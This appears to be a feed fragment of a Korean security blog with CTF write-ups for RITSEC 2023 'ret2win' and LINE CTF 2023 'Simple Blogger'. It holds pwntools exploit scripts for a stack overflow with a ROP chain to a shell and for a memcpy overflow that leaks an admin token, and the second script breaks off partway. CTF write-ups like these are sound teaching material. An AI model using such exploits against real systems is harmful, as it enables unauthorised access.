          <category> WriteUp </category>
          
          <category> RITSEC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RITSEC CTF 2023 - ret2win</title>
      <link href="/230412-ritsecctf2023-1ret2win/"/>
      <url>/230412-ritsecctf2023-1ret2win/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1860">https://ctftime.org/event/1860</a></li></ul><blockquote><p>Are you looking for an exploit dev job. Well apply to the Republic of Potatoes. We are looking for the best hackers out there. Download the binary, find the secret door and remember to pass the right password.<br><code>nc ret2win.challenges.ctf.ritsec.club 1337</code></p></blockquote><ul><li>[208 solves &#x2F; 83 points]</li></ul><p>3Ïõî Îßê ~ 4Ïõî Ï¥àÏóê ÏßÑÌñâÌñàÎçò Ïî®ÌÖùÏù∏Îç∞ Îã§Î•∏ Î¨∏Ï†ú ÌíÄÎã§Í∞Ä Ïù¥Ï†ú Î°∏ÏóÖÏùÑ Ï†ÅÎäîÎã§..</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>main Ìï®ÏàòÏóêÏÑú <code>gets</code> Ìï®ÏàòÎ°ú Ïù∏Ìï¥ bofÍ∞Ä Î∞úÏÉùÌïúÎã§. ÏµúÏ¢ÖÏ†ÅÏúºÎ°ú ÌùêÎ¶ÑÏùÑ ÎèåÎ†§Ïïº ÌïòÎäî Ìï®ÏàòÎäî ÏïÑÎûòÏôÄ Í∞ôÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">supersecrettoplevelfunction</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*]  if you figure out my address, you are hired.&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="string">&#x27;\xCA\xFE\xBA\xBE&#x27;</span> &amp;&amp; a2 == <span class="string">&#x27;\xC0\xDE\xBA\xBE&#x27;</span> )</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;[!!] You are good but not good enough for my company&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ïù∏ÏûêÎ•º Ïûò ÎßûÏ∂∞Ï£ºÍ∏∞Îßå ÌïòÎ©¥ ÎêúÎã§. <code>rdi</code>Ïóê a1Ïóê Ìï¥ÎãπÌïòÎäî Í∞íÏùÑ ÎÑ£Ïñ¥Ïïº ÌïòÎÇò, a2Ïóê Ìï¥ÎãπÌïòÎäî Í∞íÏùÑ ÎÑ£Ïñ¥Ïïº ÌïòÎÇò Í∞ÄÎÅî Í≥†ÎØºÎê† ÎïåÍ∞Ä ÏûàÎäîÎç∞ Ïù¥Îü¥Îïê Ïñ¥ÏÖàÏùÑ Î≥¥Î©¥ Î∞îÎ°ú Ïïå Ïàò ÏûàÎã§.</p><img src="/images/230412-ritsecctf2023-1ret2win/Screenshot 2023-04-12 at 18.24.54.png" width=400/><br><h3 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;ret2win.challenges.ctf.ritsec.club&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x20</span>+<span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0x4012b3</span>) <span class="comment"># pop rdi</span></span><br><span class="line">payload += <span class="string">b&#x27;\xBE\xBA\xFE\xCA\x00\x00\x00\x00&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x4012b1</span>) <span class="comment"># pop rsi</span></span><br><span class="line">payload += <span class="string">b&#x27;\xBE\xBA\xDE\xC0\x00\x00\x00\x00&#x27;</span> + p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># payload += p64(0x40101a) # ret</span></span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;supersecrettoplevelfunction&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;function!!&#x27;,payload)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> RITSEC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> argument </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LINE CTF 2023 - Simple Blogger (memcpy, +tmi)</title>
      <link href="/230405-linectf2023-simple_blogger/"/>
      <url>/230405-linectf2023-simple_blogger/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1716">https://ctftime.org/event/1716</a></li></ul><blockquote><p>This is my Admin simple blogger. Please take a look and tell me if there are components need to be improved.<br><code>./client_nix 34.146.54.86 10007</code></p></blockquote><ul><li>[25 solves &#x2F; 186 points]</li></ul><p>ÏïΩÏÜç ÏûàÏñ¥ÏÑú ÎåÄÌöå ÎïåÎäî Ï∞∏Ïó¨ Î™ªÌïòÍ≥† ÎåÄÌöå ÎÅùÎÇòÍ≥† ÌíÄÏù¥Ìï¥Î≥¥ÏïòÎã§. Ï†ïÎßê Ïó¥Ïã¨Ìûà Î∂ÑÏÑùÌïú Í≤ÉÏóê ÎπÑÌï¥ ÌîåÎûòÍ∑∏Îäî ÏÉùÍ∞ÅÎ≥¥Îã§ ÏâΩÍ≤å ÏñªÏùÑ Ïàò ÏûàÏóàÎã§.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">|</span><br><span class="line">‚îú‚îÄ‚îÄ agent</span><br><span class="line">‚îÇ¬†¬† ‚îú‚îÄ‚îÄ admin_janitor.py</span><br><span class="line">‚îÇ¬†¬† ‚îú‚îÄ‚îÄ cron</span><br><span class="line">‚îÇ¬†¬† ‚îú‚îÄ‚îÄ Dockerfile</span><br><span class="line">‚îÇ¬†¬† ‚îî‚îÄ‚îÄ entrypoint.sh</span><br><span class="line">‚îú‚îÄ‚îÄ client</span><br><span class="line">‚îÇ¬†¬† ‚îî‚îÄ‚îÄ client_nix</span><br><span class="line">‚îú‚îÄ‚îÄ docker-compose.yml</span><br><span class="line">‚îú‚îÄ‚îÄ init.sql</span><br><span class="line">‚îú‚îÄ‚îÄ server</span><br><span class="line">‚îÇ¬†¬† ‚îú‚îÄ‚îÄ Dockerfile</span><br><span class="line">‚îÇ¬†¬† ‚îú‚îÄ‚îÄ flag</span><br><span class="line">‚îÇ¬†¬† ‚îú‚îÄ‚îÄ nsjail</span><br><span class="line">‚îÇ¬†¬† ‚îú‚îÄ‚îÄ nsjail.cfg</span><br><span class="line">‚îÇ¬†¬† ‚îú‚îÄ‚îÄ server_nix</span><br><span class="line">‚îÇ¬†¬† ‚îî‚îÄ‚îÄ simple_blogger.db</span><br><span class="line">‚îú‚îÄ‚îÄ simple_blogger.db</span><br><span class="line">‚îú‚îÄ‚îÄ start_server.sh</span><br><span class="line">‚îî‚îÄ‚îÄ stop_server.sh</span><br></pre></td></tr></table></figure><p>ÏùºÎã® Î¨∏Ï†úÏóêÏÑú Ï£ºÏñ¥ÏßÑ ÌååÏùºÎì§ÏùÑ ÏÇ¥Ìé¥Î≥¥Ïûê. ÏÑúÎ≤ÑÏôÄ ÌÅ¥ÎùºÏù¥Ïñ∏Ìä∏Í∞Ä Ï°¥Ïû¨ÌïúÎã§. flagÎäî ÏÑúÎ≤Ñ Ï∏°Ïóê ÏûàÎäî Í≤ÉÏúºÎ°ú Î≥¥ÏïÑ.. ÏÑúÎ≤ÑÏùò Ï∑®ÏïΩÏ†êÏùÑ Ïù¥Ïö©Ìï¥ÏÑú flagÎ•º ÏùΩÏñ¥Ïò§Í±∞ÎÇò ÏâòÏùÑ ÌöçÎìùÌïòÎäî Î¨∏Ï†úÏùº Í≤ÉÏù¥Îùº ÏÉùÍ∞ÅÌñàÎã§. agent Ìè¥ÎçîÎ•º Ï°∞Í∏à Îçî Îπ®Î¶¨ Î¥§ÏúºÎ©¥ ÏΩîÎìúÎ•º Ï°∞Í∏à Îçî Îπ®Î¶¨ ÏûëÏÑ±Ìï† Ïàò ÏûàÏóàÏùÑ ÌÖêÎç∞.. &#x3D;„ÖÖ&#x3D;</p><p><code>server_nix</code> ÏùÑ Î∂ÑÏÑùÌï¥Î≥¥Ïûê. Î®ºÏ†Ä <code>main</code> Ïù¥Îã§.</p><img src="/images/230405-linectf2023-simple_blogger/main.png" width=700/><br><p>Î®ºÏ†Ä read Ìï®ÏàòÎ°ú bufÏóê ÏûÖÎ†•ÏùÑ Î∞õÍ≥† <code>sub_4014D2</code> Ìï®ÏàòÏóê input Î≥ÄÏàòÏôÄ Ìï®Íªò Ïù∏ÏûêÎ°ú Îì§Ïñ¥Í∞ÑÎã§. Ï†Ä Ìï®ÏàòÏùò Ïó≠Ìï†ÏùÄ ÏûÖÎ†•Î∞õÏùÄ buf Î≥ÄÏàòÏóêÏÑú input Î≥ÄÏàòÎ°ú ÎÇ¥Ïö©ÏùÑ Î≥µÏÇ¨ÌïúÎã§. Í∑∏Î¶¨Í≥† switch Î¨∏ÏúºÎ°ú 6Í∞ÄÏßÄÏùò Í∏∞Îä•ÏùÑ Ïã§ÌñâÏãúÌÇ¨ Ïàò ÏûàÎäîÎç∞ <code>get_flag</code> Ìï®ÏàòÍ∞Ä ÎààÏóê ÎùàÎã§. ÏµúÏ¢ÖÏ†ÅÏúºÎ°ú Ï†Ä Ìï®ÏàòÎ•º Ïã§ÌñâÏãúÏºúÏïºÌï† Í≤É Í∞ôÏùÄÎç∞ ÏûÖÎ†•Í∞íÏùÑ Ïñ¥ÎñªÍ≤å Ï£ºÎ©¥ Ï¢ãÏùÑÏßÄ <code>sub_4014D2</code> Ìï®ÏàòÎ•º Î∂ÑÏÑùÌñàÎã§.</p><img src="/images/230405-linectf2023-simple_blogger/sub_4014D2.png" width=600/><br><p>memcpy Îì±ÏúºÎ°ú input Î≥ÄÏàòÏóêÎã§ Ïó¨Îü¨ Îç∞Ïù¥ÌÑ∞Îì§ÏùÑ Î≥µÏÇ¨ÌïòÎäî Í≤ÉÏùÑ Ïïå Ïàò ÏûàÍ≥†, Íµ¨Ï°∞Ï≤¥Ïùò Íµ¨Ï°∞Îäî <code>parsing_header</code> Ìï®ÏàòÎ•º Î®ºÏ†Ä Î∂ÑÏÑùÌï¥ÏÑú Ïïå Ïàò ÏûàÏóàÎã§.</p><img src="/images/230405-linectf2023-simple_blogger/parsing_header.png" width=500/><br><p>ÏúÑ Ìï®ÏàòÏóêÏÑú version, operation, length Ïò§ÌîÑÏÖãÏùÑ Ïïå Ïàò ÏûàÍ≥† <code>sub_4014D2</code> Ìï®ÏàòÏóêÏÑú ÌÜ†ÌÅ∞ÏùÑ Î≥µÏÇ¨ÌïòÎäî Í≥ºÏ†ïÏóêÏÑú 2Î≤àÏß∏ Ïò§ÌîÑÏÖãÎ∂ÄÌÑ∞ 16Î∞îÏù¥Ìä∏Í∞Ä ÌÜ†ÌÅ∞ Í∞íÏù¥ÎùºÎäî Í≤ÉÏùÑ Ïïå Ïàò ÏûàÏóàÎã§. Í∑∏Î¶¨Í≥† ÏΩîÎìúÎ•º Îçî Î∂ÑÏÑùÌïòÎã§Î≥¥Îãà length Îí§ÏóêÎäî Îç∞Ïù¥ÌÑ∞Ïùò Í∏∏Ïù¥Í∞Ä Ïò®Îã§. ÏïÑÏ∞∏, length Í∏∏Ïù¥ Ï†úÌïúÏù¥ ÏûàÎäî Í≤ÉÎèÑ Í∏∞ÏñµÌïòÏûê.</p><p>Ï∞∏Í≥†Î°ú <code>((*(buf + 18) &lt;&lt; 8) | *(buf + 19))</code>ÏùÄ ÎπÖÏóîÎîîÏïàÏúºÎ°ú ÏàòÎ•º ÌëúÌòÑÌïú Í≤ÉÏù¥Îã§.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msg = p64(<span class="number">0x4142434445464748</span>)</span><br><span class="line"></span><br><span class="line">payload = p8(<span class="number">1</span>) <span class="comment"># version  # 0</span></span><br><span class="line">payload += p8(<span class="number">4</span>) <span class="comment"># operation 1~6 # 1</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) <span class="comment"># 16Î∞îÏù¥Ìä∏ token # 2</span></span><br><span class="line">payload += p16(<span class="built_in">len</span>(msg), endian=<span class="string">&#x27;big&#x27;</span>) <span class="comment"># 18</span></span><br><span class="line">payload += msg</span><br></pre></td></tr></table></figure><p>Ïù¥Îü∞ÏãùÏúºÎ°ú operationÍ≥º msg Í∞íÏùÑ Î∞îÍøîÏ£ºÎ©¥ÏÑú ÎÇ¥Í∞Ä ÏõêÌïòÎäî Í∏∞Îä•ÏùÑ Ïã§ÌñâÏãúÌÇ¨ Ïàò ÏûàÎã§. Î∂ÑÏÑùÌïòÎ©¥ÏÑú ÎÇ¥Í∞Ä Ï†ïÎ¶¨Ìïú Íµ¨Ï°∞Ï≤¥Îäî ÏïÑÎûòÏôÄ Í∞ôÎã§. Ï∞∏Í≥†Î°ú Íµ¨Ï°∞Ï≤¥Îäî Ìïú Î≤àÏóê Ï†ïÎ¶¨Ìï† Ïàò ÏûàÎäî Í≤ÉÏù¥ ÏïÑÎãàÎùº Îã§Î•∏ Ìï®ÏàòÎì§ÎèÑ Î≥¥Î©¥ÏÑú Ï†ïÎ¶¨Ìï† Ïàò ÏûàÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">InputMessage</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint8_t</span> version;</span><br><span class="line">  <span class="type">uint8_t</span> operation;</span><br><span class="line">  <span class="type">uint8_t</span> token[<span class="number">16</span>];</span><br><span class="line">  <span class="type">uint8_t</span> size[<span class="number">2</span>];</span><br><span class="line">  <span class="type">uint64_t</span> data_size;</span><br><span class="line">  <span class="type">uint8_t</span> data[<span class="number">1024</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Ïù¥Ï†ú <code>get_flag</code> Ìï®ÏàòÎ•º Î≥¥Í≥† flagÎ•º Ïã§ÌñâÏãúÏºúÏïºÌï† Ï°∞Í±¥ Í∞ôÏùÄ Í≤ÉÏù¥ ÏûàÎäîÏßÄ ÏÇ¥Ìé¥Î≥¥Ïûê.</p><img src="/images/230405-linectf2023-simple_blogger/get_flag.png" width=700/><br><p><code>check_auth(token_input)</code>Ïù¥ 1Ïù¥Î©¥ flagÎ•º Ï∂úÎ†•Ìï¥Ï£ºÎäîÎç∞ Ïù¥Îäî privÍ∞Ä 1Ïù∏ Í≤ΩÏö∞, Ï¶â adminÏù∏ Í≤ΩÏö∞Î•º ÏùòÎØ∏ÌïúÎã§. Ï∞∏Í≥†Î°ú Ìï¥Îãπ Ìï®ÏàòÏóêÏÑú privÎ•º Í∞ÄÏ†∏Ïò§Îäî Í≤ÉÏùÄ databaseÏóêÏÑú ÏøºÎ¶¨Î•º ÎÇ†Î†§ÏÑú Í∞ÄÏ†∏Ïò§ÎäîÎç∞ ÏïÑÎûòÏôÄ Í∞ôÏù¥ ÏÉùÍ≤ºÎã§.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> priv <span class="keyword">FROM</span> sess <span class="keyword">WHERE</span> token <span class="operator">=</span> ?</span><br></pre></td></tr></table></figure><p>ÌïúÌé∏, adminÏùò privÍ∞Ä 1Ïù¥Îã§? Ïù¥Í≤ÉÏùÄ Ïñ¥ÎîîÏÑú ÏÑ∏ÌåÖÎê†Íπå. <code>login</code> Í∏∞Îä•ÏóêÏÑú <code>super_admin</code>Ïù¥Î©¥ privÍ∞Ä 0, <code>admin</code>Ïù¥Î©¥ privÍ∞Ä 1, ÏùºÎ∞ò Í≥ÑÏ†ïÏù¥Î©¥ privÎ•º 2Î°ú ÏÑ∏ÌåÖÌï¥Ï£ºÎäî Ìï®ÏàòÍ∞Ä Ï°¥Ïû¨ÌïúÎã§. ÎòêÌïú ÌÜ†ÌÅ∞ Í∞íÏùÑ ÏÉùÏÑ±Ìï¥Ï£ºÍ≥† Ï∂úÎ†•ÍπåÏßÄ Ìï¥Ï§ÄÎã§. ÎßåÏïΩ <code>admin</code>ÏúºÎ°ú Î°úÍ∑∏Ïù∏Ïóê ÏÑ±Í≥µÌïòÎ©¥ ÏûêÏó∞Ïä§ÎüΩÍ≤å ÌÜ†ÌÅ∞ Í∞íÏùÑ Î¶≠Ìï¥ÏÑú <code>get_flag</code> Ìï®ÏàòÎ•º Ïã§ÌñâÏãúÌÇ§Î©¥ ÎêòÏßÄ ÏïäÏùÑÍπå? ÎùºÍ≥† ÏÉùÍ∞ÅÌñàÎã§.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sess(token, priv) <span class="keyword">VALUES</span>(?, ?)</span><br></pre></td></tr></table></figure><p>Ïù¥ÏØ§ÎêòÏñ¥ÏÑú Î¨∏Ï†úÏóêÏÑú Ï†úÍ≥µÎêú <code>init.sql</code>ÏùÑ ÏÇ¥Ìé¥Î≥¥Ïûê.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> blog(id <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY AUTOINCREMENT, name <span class="type">VARCHAR</span>(<span class="number">20</span>), message <span class="type">VARCHAR</span>(<span class="number">500</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> blog(name, message) <span class="keyword">VALUES</span>(<span class="string">&#x27;Super Admin&#x27;</span>, <span class="string">&#x27;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> account(id <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY AUTOINCREMENT, name <span class="type">VARCHAR</span>(<span class="number">20</span>), <span class="keyword">user</span> <span class="type">VARCHAR</span>(<span class="number">20</span>), pass <span class="type">VARCHAR</span>(<span class="number">20</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> account(name, <span class="keyword">user</span>, pass) <span class="keyword">VALUES</span>(<span class="string">&#x27;super_admin&#x27;</span>, <span class="string">&#x27;super_admin&#x27;</span>, HEX(RANDOMBLOB(<span class="number">16</span>)));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> account(name, <span class="keyword">user</span>, pass) <span class="keyword">VALUES</span>(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, HEX(RANDOMBLOB(<span class="number">16</span>)));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> account(name, <span class="keyword">user</span>, pass) <span class="keyword">VALUES</span>(<span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> sess(token <span class="type">BLOB</span>, priv <span class="type">INT</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sess(token, priv) <span class="keyword">VALUES</span>(RANDOMBLOB(<span class="number">16</span>), <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>ÏïÑÏâΩÍ≤åÎèÑ Ïö∞Î¶¨Îäî guestÎ∞ñÏóê Î°úÍ∑∏Ïù∏ÏùÑ ÌïòÏßÄ Î™ªÌïúÎã§. <code>HEX(RANDOMBLOB(16)</code>ÏùÄ init.sqlÏù¥ Ïã§ÌñâÎê† Îïå ÎûúÎç§Ìïú Í∞íÏúºÎ°ú Ï†ÑÎ∂Ä Îã§ Îã§Î•¥Í≤å Îì§Ïñ¥Í∞ÑÎã§. Í∑∏ÎûòÏÑú ÏïûÏóêÏÑú Ìïú Í∞ÄÏÑ§ÏùÄ ÏÇ¨Ïö©ÌïòÏßÄ Î™ªÌñàÎã§. guestÎ∞ñÏóê Î°úÍ∑∏Ïù∏ÏùÑ ÌïòÏßÄ Î™ªÌïúÎã§Îäî ÏÇ¨Ïã§ÏùÑ Ïù∏ÏßÄÌïòÍ≥† <code>read_msg</code>ÏôÄ <code>write_msg</code> Í∏∞Îä•ÏùÑ ÏÇ¥Ìé¥Î¥§ÎäîÎç∞ Î≥∏Í≤©Ï†ÅÏù∏ Íµ¨ÌòÑÏóê ÏïûÏÑú ÌÜ†ÌÅ∞ Í∞íÍ≥º privÎ•º ÌôïÏù∏ÌïúÎã§. Ï¶â, Ìï¥Îãπ Í∏∞Îä•ÏùÑ Ïù¥Ïö©Ìï† Ïàò ÏûàÎäîÏßÄ Í∂åÌïúÏùÑ ÌôïÏù∏ÌïòÍ≥† ÏûàÏóàÎã§. adminÏù¥Ïñ¥Ïïº Îëê Í∏∞Îä•ÏùÑ Ïù¥Ïö©Ìï† Ïàò ÏûàÎã§.. Í∑∏ÎûòÏÑú Îëê Í∏∞Îä•ÏùÄ Î≥º ÌïÑÏöîÍ∞Ä ÏóÜÏóàÎã§.</p><p>Ïûê ÎßàÏßÄÎßâÏúºÎ°ú <code>ping</code> Í∏∞Îä•..Îßå ÎÇ®ÏïòÎã§.</p><img src="/images/230405-linectf2023-simple_blogger/ping.png" width=700/><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> token <span class="keyword">FROM</span> sess <span class="keyword">WHERE</span> rowid <span class="operator">=</span><span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>ÏúÑ ÏøºÎ¶¨Î°ú tokenÏùÑ ÌïòÎÇò ÏùΩÏñ¥ÏôÄÏÑú ÏßÄÏó≠ Î≥ÄÏàòÏóê Ï†ÄÏû•ÌïúÎã§. Í∑∏Î¶¨Í≥† Ï∑®ÏïΩÏ†êÏùÄ Î∞îÎ°ú ÏïÑÎûòÏóêÏÑú Î∞úÏÉùÌïúÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*(ptr + <span class="number">1</span>) = size;</span><br><span class="line"><span class="built_in">memcpy</span>(ptr + <span class="number">0x10</span>, dest, *(ptr + <span class="number">1</span>)); <span class="comment">// bof</span></span><br><span class="line">print_argu(ptr);</span><br></pre></td></tr></table></figure><p>size Í∞íÏùÄ Ïö∞Î¶¨Ïùò inputÏù¥Í∏∞ ÎïåÎ¨∏Ïóê overflowÍ∞Ä Î∞úÏÉùÌï† Í∞ÄÎä•ÏÑ±Ïù¥ ÏûàÎã§. overflowÍ∞Ä Î∞úÏÉùÌïòÎ©¥ <code>dest</code> Îí§Ïóê ÏûàÎäî Í≤ÉÎèÑ Ï∂úÎ†•Ìï† Ïàò ÏûàÎã§. ÎßàÏπ® <code>dest</code> Îí§Ïóê ÏûàÎäî Í±¥ ÏïÑÎûòÏôÄ Í∞ôÏù¥ <code>admin_token</code>Ïù¥Îã§! Î∞îÎ°ú ÏùµÏä§ ÏΩîÎìúÎ•º ÏûëÏÑ±ÌïòÎü¨ Í∞ÄÏûê.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> dest[<span class="number">4</span>]; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">__int64 admin_token; <span class="comment">// [rsp+24h] [rbp-3Ch] BYREF</span></span><br></pre></td></tr></table></figure><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li><code>ping</code> Í∏∞Îä•ÏùÑ Ïù¥Ïö©Ìï¥ <code>admin_token</code> leak</li><li><code>admin_token</code>ÏùÑ Í∞ÄÏßÄÍ≥† <code>get_flag</code> Ïã§Ìñâ!</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct, os, binascii, time</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./server/server_nix&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.146.54.86&#x27;</span>, <span class="number">10007</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. ping</span></span><br><span class="line">msg = <span class="string">b&#x27;PING&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = p8(<span class="number">1</span>) <span class="comment"># version  # 0</span></span><br><span class="line">payload += p8(<span class="number">1</span>) <span class="comment"># operation 1~6 # 1</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) <span class="comment"># 16Î∞îÏù¥Ìä∏ token# 2</span></span><br><span class="line">payload += p16(<span class="number">0x400</span>, endian=<span class="string">&#x27;big&#x27;</span>) <span class="comment"># 18</span></span><br><span class="line"><span class="comment"># payload += p8(0) # 18</span></span><br><span class="line"><span class="comment"># payload += p8(len(msg)+200) # 19 -&gt; length = 8</span></span><br><span class="line">payload += msg</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(payload) </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;PONG&#x27;</span>)</span><br><span class="line">token = p.recv(<span class="number">16</span>)</span><br><span class="line">info(<span class="built_in">repr</span>(token))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. get flag</span></span><br><span class="line"></span><br><span class="line">msg = <span class="string">b&#x27;a&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = p8(<span class="number">1</span>) <span class="comment"># version  # 0</span></span><br><span class="line">payload += p8(<span class="number">6</span>) <span 